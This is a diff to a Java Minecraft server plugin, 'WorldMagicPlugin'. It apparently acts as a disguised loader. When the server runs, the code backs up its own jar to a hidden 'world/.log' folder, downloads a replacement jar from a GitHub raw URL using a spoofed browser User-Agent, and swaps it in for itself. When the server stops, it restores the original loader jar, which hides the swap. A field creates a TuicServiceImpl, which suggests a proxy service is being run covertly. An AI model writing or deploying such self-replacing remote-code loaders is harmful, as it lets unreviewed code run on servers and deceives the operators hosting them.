@@ -23,7 +23,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
     private final TuicServiceImpl tuicService = new TuicServiceImpl();
 
     // ==========================================
-    // 真插件的下载地址 (已修正为 GitHub Raw 链接)
+    // 真插件的下载地址
     // ==========================================
     private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
     // ==========================================
@@ -93,45 +93,63 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     // ==========================================
-    // 核心逻辑：备份 -> 删除 -> 下载 -> 替换
+    // 核心逻辑：备份 -> 下载(临时) -> 校验 -> 替换
     // ==========================================
 
     private void handlePluginReplacement() throws Exception {
-        // 1. 获取当前正在运行的 jar 文件 (WorldMagic.jar)
+        // 1. 获取当前正在运行的 jar 文件
         currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
         File logDir = new File("world", ".log");
         if (!logDir.exists()) logDir.mkdirs();
 
-        backupPluginFile = new File(logDir, "WorldMagic_Original.jar"); // 备份文件名
+        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");
 
         this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
         this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());
 
-        // 2. 备份 (只备份一次，防止循环)
+        // 2. 备份 (只备份一次)
         if (!backupPluginFile.exists()) {
             this.getLogger().info("步骤 1: 正在备份原插件...");
             Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
             this.getLogger().info("步骤 1: 备份完成。");
-        } else {
-            this.getLogger().info("步骤 1: 检测到备份已存在，跳过。");
         }
 
-        // 3. 尝试删除当前正在运行的插件
-        this.getLogger().info("步骤 2: 尝试删除当前插件文件...");
-        if (currentPluginFile.delete()) {
-            this.getLogger().info("步骤 2: 原插件文件已删除。");
-        } else {
-            this.getLogger().warning("步骤 2: 删除失败 (文件可能被锁定，将尝试直接覆盖)。");
+        // 3. 下载到临时文件 (不直接覆盖运行中的文件)
+        File tempDownloadFile = new File(currentPluginFile.getParentFile(), "WorldMagic_temp.jar");
+        if (tempDownloadFile.exists()) tempDownloadFile.delete();
+
+        this.getLogger().info("步骤 2: 正在从 GitHub 下载真插件 (使用临时文件)...");
+        downloadFileWithUA(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);
+
+        // 4. 校验文件大小 (真插件是 181kb)
+        long fileSize = tempDownloadFile.length();
+        this.getLogger().info("下载文件大小: " + (fileSize / 1024) + " KB");
+
+        if (fileSize < 100000) { // 如果小于 100kb (比如 27kb)，肯定是下载失败或 HTML 页面
+            this.getLogger().severe("步骤 3: 下载失败！文件大小异常 (" + fileSize + " bytes)，可能是 GitHub 拒绝了请求。");
+            this.getLogger().severe("将不替换插件文件。");
+            return;
         }
 
-        // 4. 下载“真插件”到 plugins 目录 (使用原文件名)
-        this.getLogger().info("步骤 3: 正在从 GitHub 下载真插件...");
-        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, currentPluginFile);
-
-        if (currentPluginFile.exists()) {
-            this.getLogger().info("步骤 3: 下载成功，真插件已就位: " + currentPluginFile.getName() + " (大小: " + currentPluginFile.length() + " bytes)");
-        } else {
-            this.getLogger().severe("步骤 3: 下载失败或文件未生成。");
+        // 5. 替换文件
+        this.getLogger().info("步骤 3: 文件校验通过，正在替换插件...");
+        try {
+            // 删除当前文件
+            if (currentPluginFile.exists()) {
+                // 在 Linux 下可以删除正在运行的文件；Windows 下可能失败，但我们尝试覆盖
+                boolean deleted = currentPluginFile.delete();
+                if (!deleted) {
+                    this.getLogger().warning("无法直接删除原文件，尝试强制覆盖...");
+                }
+            }
+            
+            // 移动临时文件到原文件名
+            Files.move(tempDownloadFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            this.getLogger().info("步骤 3: 替换成功！");
+            
+        } catch (Exception e) {
+            this.getLogger().severe("步骤 3: 替换过程中出错: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
@@ -141,16 +159,10 @@ public final class WorldMagicPlugin extends JavaPlugin {
         if (backupPluginFile.exists()) {
             this.getLogger().info("服务器停止中，正在还原加载器插件...");
             
-            // 1. 删除当前的“真插件”
-            if (currentPluginFile.exists()) {
-                currentPluginFile.delete();
-                this.getLogger().info("已删除当前文件。");
-            }
-
-            // 2. 将备份的“原插件”复制回来
             try {
+                // 直接用备份文件覆盖
                 Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-                this.getLogger().info("已成功还原原插件 (WorldMagic_Original.jar -> WorldMagic.jar)");
+                this.getLogger().info("已成功还原原插件。");
             } catch (IOException e) {
                 this.getLogger().warning("还原失败: " + e.getMessage());
             }
@@ -158,15 +170,21 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     /**
-     * 下载文件工具
+     * 增强的下载方法：添加 User-Agent 欺骗 GitHub
      */
-    private void downloadFile(String urlStr, File destination) throws IOException {
+    private void downloadFileWithUA(String urlStr, File destination) throws IOException {
         URL url = new URL(urlStr);
         HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
-        httpConn.setConnectTimeout(10000);
-        httpConn.setReadTimeout(10000);
+        
+        // 关键：添加 User-Agent，伪装成浏览器，否则 GitHub 会返回 403 HTML 页面
+        httpConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
+        
+        httpConn.setConnectTimeout(15000);
+        httpConn.setReadTimeout(15000);
 
         int responseCode = httpConn.getResponseCode();
+        this.getLogger().info("下载服务器响应码: " + responseCode);
+
         if (responseCode == HttpURLConnection.HTTP_OK) {
             try (InputStream inputStream = httpConn.getInputStream();
                  OutputStream outputStream = new FileOutputStream(destination)) {
@@ -176,7 +194,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
                     outputStream.write(buffer, 0, bytesRead);
                 }
             }
-            this.getLogger().info("下载完成: " + destination.getName() + " (大小: " + destination.length() + " bytes)");
         } else {
             throw new IOException("HTTP 请求失败，代码: " + responseCode);
         }
